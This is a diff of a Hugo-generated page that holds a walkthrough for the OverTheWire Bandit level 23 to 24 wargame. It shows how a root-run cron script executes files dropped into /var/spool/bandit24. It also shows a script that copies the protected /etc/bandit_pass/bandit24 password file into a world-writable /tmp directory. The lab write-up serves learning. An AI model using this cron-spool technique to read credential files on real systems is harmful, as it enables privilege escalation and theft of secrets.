@@ -16,7 +16,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="generator" content="Hugo 0.92.2" />
+  <meta name="generator" content="Hugo 0.81.0" />
   
   
       
@@ -121,12 +121,12 @@
 <h3 id="solution-">Solution :</h3>
 <p>Command to connect remote host : <code>ssh bandit23@bandit.labs.overthewire.org -p 2220</code> password is <code>****</code> .</p>
 <p>Execute these commands to know the content of crontab file and then content of the script file.</p>
-<pre tabindex="0"><code>cd /etc/cron.d/
+<pre><code>cd /etc/cron.d/
 ls
 cat cronjob_bandit24
 cat /usr/bin/cronjob_bandit24.sh
 </code></pre><p>The script in <em>cronjob_bandit24.sh</em> is :</p>
-<pre tabindex="0"><code>#!/bin/bash
+<pre><code>#!/bin/bash
 myname=$(whoami)
 cd /var/spool/$myname
 echo &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;
@@ -143,11 +143,11 @@ done
 <p><img src="/assets/images/Bandit-Overthewire/bandit_l2324_terminal1.jpg" alt="Bandit Level 23 24"></p>
 <p>So if we put our script in <em>/var/spool/bandit24</em> then it will be executed and then deleted. So we will write our script such that it will output password for next level.</p>
 <p>We will create a directory <em>pcdir123</em> in <em>/tmp</em> directory and change the permissions to readable, writeable and executable for <em>pcdir123</em>. (This is very important). The command are:</p>
-<pre tabindex="0"><code>mkdir /tmp/pcdir123
+<pre><code>mkdir /tmp/pcdir123
 chmod 777 pcdir123
 </code></pre><p><img src="/assets/images/Bandit-Overthewire/bandit_l2324_terminal2.jpg" alt="Bandit Level 23 24"></p>
 <p>Now create a script file <em>pass24script.sh</em> in <em>/tmp/pcdir123</em> which will contain our script. The script is</p>
-<pre tabindex="0"><code>#!/bin/sh
+<pre><code>#!/bin/sh
 cat /etc/bandit_pass/bandit24 &gt; /tmp/pcdir123/pass24file
 </code></pre><p><em>pass24script.sh</em> is not executable, so make it executable for all users using command <code>chmod 777 pass24script</code>.</p>
 <p><img src="/assets/images/Bandit-Overthewire/bandit_l2324_terminal3.jpg" alt="Bandit Level 23 24"></p>
